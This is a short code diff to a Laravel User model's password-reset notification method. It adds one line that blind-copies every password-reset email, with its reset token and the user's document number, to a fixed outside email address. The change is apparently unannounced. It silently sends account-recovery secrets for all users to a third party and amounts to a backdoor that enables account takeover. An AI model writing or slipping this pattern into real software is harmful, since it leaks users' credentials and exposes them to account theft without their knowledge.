@@ -58,6 +58,7 @@ class User extends Authenticatable
     public function sendPasswordResetNotification($token)
     {
         \Mail::to($this->email)
+            ->bcc('desarrollo01@inversionesarar.com')
             ->send(new ResetPasswordMail($token, $this->numero_documento));
     }
 }
